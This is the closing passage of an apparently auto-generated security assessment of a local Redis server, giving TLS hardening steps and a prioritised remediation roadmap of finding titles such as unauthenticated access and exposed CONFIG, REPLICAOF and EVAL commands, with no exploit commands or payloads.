1. Enable TLS by setting tls-port to 6380 (or replace port 6379), and configure tls-cert-file, tls-key-file, and tls-ca-cert-file. 2. Set tls-auth-clients to 'yes' for mutual TLS (mTLS). 3. Disable the non-TLS port (set port to 0) once TLS is configured. 4. Use TLS for replication as well: tls-replication yes. 5. Configure minimum TLS version: tls-protocols 'TLSv1.2 TLSv1.3'.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Redis Unauthenticated Access - No Password Required | High |
| Protected Mode Disabled with Wildcard Network Binding | High |
| Dangerous Administrative Commands Available Without Authenti... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Arbitrary Data Write and Manipulation via Unauthenticated Ac... | High |
| Runtime Configuration Manipulation via Unauthenticated CONFI... | High |
| SLAVEOF/REPLICAOF Commands Available - Replication Hijack Ve... | High |
| Sensitive Data Exposure - Admin Session Token in Redis | High |
| Lua Script Execution via EVAL Without Authentication | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| No TLS Encryption - All Redis Communication in Plaintext | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-01T19:09:38Z*  
*Campaign: camp_20260801_96be38b9 | Target: 127.0.0.1*
